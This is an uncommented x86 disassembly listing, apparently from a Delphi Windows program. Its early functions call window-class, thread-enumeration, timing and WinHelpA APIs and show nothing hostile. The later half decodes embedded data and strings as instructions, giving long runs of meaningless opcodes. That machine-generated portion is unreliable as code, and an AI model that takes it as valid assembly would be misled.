xor eax eax
push ebp
push sub_43a79e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408f8c
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43a1f4
mov eax ebx
call sub_43ab38
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a7a5
lea eax [ ebp - 0x110 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40420c
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_43aa90
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40420c
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a7bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43a81e
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a825
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43a1f4
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43a830
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a8b0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_43a1f4
mov eax ebx
call sub_43ab38
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a8b7
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43aa90
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a9c0
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408a04
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_43aa1b
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4089e0
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_43aa90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40444c
xor eax eax
push ebp
push sub_43ab06
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_43aa74
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ab0d
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407fdc
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_43ab1c
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_43ab38
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_43aa74
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_43ab18
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_43ab1c
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_43ab94
sub_43ab94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43ac11
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43a5f4
call GetTickCount
mov ebx eax
push 0x0
call sub_40651c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43a1f4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ac18
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43ac20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403570
call sub_4059e4
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43ac68
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_43ac94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ad02
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad09
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4059cc
mov eax rw-data
call sub_4059cc
mov eax rw-data
call sub_4059cc
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_4059cc
mov eax [ rw-data ]
call sub_43a2c4
sub_43ad0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ad5e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad65
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43ac20
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4059cc
mov edx eax
mov eax [ rw-data ]
call sub_42b450
sub_43ad68
insb
lodsd [ esi ]
inc ebx
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
push eax
fld [ ebx ]
or edx [ esp + eax * 2 + 0x72 ]
popad
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add [ eax - 0x27 ] dl
inc ebx
add [ eax ] dl
fiadd [ ebx ]
rcr cl 0x43
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
nop
mov [ ebp + 0x7010043 ] ch
push esp
inc ebx
jne r-xdata
inc eax
add [ esi + ebp * 4 + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x340043ae
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5fffbc27 ] dh
fld [ ebx ]
test al 0x34
inc eax
jae r-xdata
add al bl
scasd [ edi ]
inc ebx
add [ eax ] al
inc esp
jb r-xdata
add [ ebx + 0x43aee8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 ] dl
inc ebx
add [ eax + eax ] bh
add [ eax ] al
clc
lodsd [ esi ]
inc ebx
add [ esp + esi - 0x264fffc0 ] dl
inc ebx
add [ eax - 0x57ffbc27 ] ah
xor al 0x40
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ edx + ebx * 8 ] bh
inc ebx
add [ ecx + ebx * 8 ] ch
inc ebx
add [ eax ] ch
fld [ ebx ]
sub al 0xd8
inc ebx
add ah ah
fld [ ebx ]
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 2 - 0x52 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 - 0x52 ] si
inc ebx
add [ ecx + edx + 0x40 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x52 ] ch
inc ebx
add [ eax + eax ] dh
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi - 0x264fffc0 ] dl
inc ebx
add [ eax - 0x57ffbc27 ] ah
xor al 0x40
jb r-xdata
fld [ ebx ]
mov ah 0xda
inc ebx
add [ eax ] dl
fiadd [ ebx ]
rcr cl 0x43
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x38 ] si
mov al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 4 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
pushad
scasd [ edi ]
inc ebx
add [ esp + esi - 0x264fffc0 ] dl
inc ebx
add ah dl
fiadd [ ebx ]
test al 0x34
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ edx + ebx * 8 ] bh
inc ebx
add [ eax - 0x26 ] dh
inc ebx
add [ eax + 0x2c0043da ] cl
fadd [ ebx ]
in al 0xd9
inc ebx
add al dh
xlat
inc ebx
add [ edx + ebx * 8 - 0x26b7ffbd ] dl
inc ebx
add [ edx + ebx * 8 - 0x25efffbd ] dh
inc ebx
add al al
fld [ ebx ]
adc al 0x54
add [ eax ] al
pushfd
scasb [ edi ]
inc ebx
add [ esp + esi - 0x264fffc0 ] dl
inc ebx
add [ eax - 0x57ffbc27 ] ah
xor al 0x40
add [ eax ] al
fsubr [ edi + r--data ]
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
mov al [ 0x30043ad ]
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ ebp + ebp * 4 + 0x61060043 ] bl
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ esp + ebx * 8 - 0x26d7ffbd ] dh
inc ebx
add [ eax + ebx * 8 ] ch
inc ebx
add [ ebx + ebx * 8 + 0x43 ] ch
add al dh
xlat
inc ebx
add [ ecx + ebx * 8 + 0x43 ] al
add [ eax - 0x27 ] cl
inc ebx
add [ eax - 0x27 ] dl
inc ebx
add al cl
fild [ ebx ]
inc ebx
outsd
outsb
je r-xdata
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
fld [ ebx ]
test al 0x34
inc eax
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x30 ] si
scasd [ edi ]
inc ebx
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
add [ eax - 0x27 ] dl
inc ebx
add al cl
fild [ ebx ]
fcomp st2
inc ebx
add [ eax ] dl
fadd [ ebx ]
mov esp ds
inc ebx
add [ eax - 0x3fffbc24 ] ah
fadd [ ebx ]
adc [ esp + eax * 2 + 0x72 ] edx
popad
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
sub [ edx + 0x43 ] dh
outsd
insb
jae r-xdata
fcomp st2
inc ebx
add [ eax ] dl
fadd [ ebx ]
mov esp ds
inc ebx
add [ eax - 0x3fffbc24 ] ah
fadd [ ebx ]
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx - 0x4f ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
fld [ ebx ]
dec eax
fld [ ebx ]
push eax
fld [ ebx ]
enter 0x43db 0x0
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
enter 0x43b0 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xb1
inc ebx
add [ eax ] dh
add [ eax ] al
pushfd
scasb [ edi ]
inc ebx
add [ esp + esi - 0x264fffc0 ] dl
inc ebx
add [ eax - 0x57ffbc27 ] ah
xor al 0x40
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0xdb
inc ebx
add [ edx + ebx * 8 ] bh
inc eax
add [ edx + ebx * 8 ] bh
inc ebx
add [ eax - 0x26 ] dh
pushfd
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor al [ eax ]
cmp al 0x32
inc eax
add al ch
xlat
inc ebx
add [ ecx + ebx * 8 ] ch
inc ebx
add [ eax ] ch
fld [ ebx ]
sub al 0xd8
inc ebx
add [ eax - 0xfffbc29 ] dl
xlat
outsd
insd
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esp + eax ] dh
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x43b18cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
mov cl 0x43
add [ eax ] dh
add [ eax ] al
jl r-xdata
inc ebx
outsd
outsb
je r-xdata
inc esp
fld [ ebx ]
dec eax
fld [ ebx ]
je r-xdata
inc edx
add [ eax ] cl
int1
inc ebx
add [ eax + 0x4 ] ch
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
jae r-xdata
push esp
inc esp
jb r-xdata
inc ebx
add [ esp + esi - 0x264fffc0 ] dl
inc ebx
add al cl
fadd [ ebx ]
test al 0x34
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0xdb
inc ebx
add [ eax + 0x2c0043da ] cl
fadd [ ebx ]
in al 0xd9
inc ebx
add al dh
xlat
inc ebx
add [ edx + ebx * 8 - 0x26b7ffbd ] dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 8 - 0x52 ] si
inc ebx
add [ esi + ebp * 4 + 0x43 ] dh
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ecx + ebx * 8 + 0x43 ] al
add [ eax - 0x27 ] cl
inc ebx
add [ eax - 0x27 ] dl
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
mov dl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] al
inc ebx
add [ eax + eax ] ah
add [ ecx + ebx + 0x34940042 ] al
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffbc12 ] bl
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add ah al
aas
inc edx
add [ eax - 0x3bffbdc1 ] dh
out dx al
inc ebx
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
push esp
mov dl 0x43
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ edx + ebx * 8 ] bh
inc ebx
add [ esp + ebx * 8 - 0x26d7ffbd ] dh
inc ebx
add [ eax + ebx * 8 ] ch
inc ebx
add [ ebx + ebx * 8 + 0x43 ] ch
add al dh
xlat
inc ebx
add [ ecx + ebx * 8 + 0x43 ] al
add [ eax - 0x27 ] cl
inc ebx
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ ebx + ebx * 8 ] bh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx * 8 - 0x50 ] si
inc ebx
add [ edi + ebp * 4 ] ch
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ edx + ebx * 8 - 0x25efffbd ] dh
inc ebx
add al al
fld [ ebx ]
adc dl [ esp + eax * 2 + 0x72 ]
popad
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
inc edx
add [ eax ] ch
inc ebx
add [ esp + eax - 0xc2bffbe ] bl
inc ebx
add ah ch
add eax [ edx ]
add [ edx + eax * 2 ] 0x0
aam 0x4
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebp - 0x5053ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x4
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 4 + 0x43 ] al
add [ eax + eax ] bl
add [ eax ] al
in al 0xc2
inc esp
add [ esp + esi + 0x34a00040 ] dl
inc eax
mov dl 0x43
add al dh
sbb [ edx ] eax
add al 0x0
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
add [ edx + esi * 8 ] dl
inc ebx
add ah cl
leave
inc esp
add [ eax - 0xbffbc0e ] cl
leave
inc esp
add [ eax ] cl
0x44
outsd
insb
jae r-xdata
add [ ebp - 0x4d37ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_43b2fc
add ah dh
inc ebx
add [ edx + esi * 8 - 0x35bbffbd ] bh
inc esp
add [ eax - 0x36 ] bl
inc esp
add ah dh
inc ebx
add [ eax + 0x500044ca ] al
inc ebx
add [ eax + 0x700044ca ] cl
inc ebx
add [ eax - 0x7bffbb36 ] dl
hlt
sub_43b4fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4b ] bl
inc ebx
add [ eax ] ah
add [ eax ] al
add al ah
jg r-xdata
jb r-xdata
inc eax
add al cl
mov ah 0x43
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
add [ esp + esi + 0x34a00040 ] dl
jae r-xdata
insb
jae r-xdata
add [ esp + esi * 4 + 0x43 ] edi
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dl
mov bl 0x43
add [ ebx ] cl
jae r-xdata
pop eax
mov ah 0x43
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
mov ah 0x43
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
push 0x10043f0
inc ebx
outsd
outsb
jae r-xdata
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add ah dh
imul ebp [ esi + 0x74 ] 0x657a6953
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
fdiv [ ebx + eax * 2 + 0x1000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43b4d874
jb r-xdata
outsd
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
push 0x10043f0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
popad
js r-xdata
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
[ eax - 0x10 ]
mov ah 0x43
add [ eax ] dl
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x43b54473
add [ eax + eax * 4 + 0x41 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jb r-xdata
jb r-xdata
je r-xdata
add [ eax + eax ] dl
add bh bh
push 0x10043f0
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
sub al 0xb6
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
mov ah 0x43
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
dec ebp
add [ ecx ] al
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
inc ebx
outsd
insb
jae r-xdata
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
jae r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ eax ] cl
add [ eax ] al
[ eax - 0x10 ]
add al bl
mov ah 0x43
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ecx + edx + 0x10800040 ] al
inc eax
add al cl
js r-xdata
adc [ eax ] 0x40
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
jpe sub_43b552
imul ebp [ edi + 0x6e ] 0xb480c08b
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
xor [ ebx + eax * 2 + 0x540b0300 ] 0x41
outsb
or [ ebx + 0x6f ] al
outsb
je r-xdata
dec esp
popad
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
add [ eax ] cl
push cs
push esp
add [ eax + r-xdata ] dl
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
popad
outsb
add [ ecx + edx + 0x11840040 ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add eax 0x0
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
inc ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add [ esp + esi * 4 + 0x43 ] bh
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
jo r-xdata
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
jb r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add ah dl
mov bl 0x43
test [ ecx ] dl
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ecx ] al
add [ eax ] al
add [ eax + 0x80043b3 ] bl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ esp + esi * 4 ] ah
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
test [ ecx ] dl
inc eax
add al cl
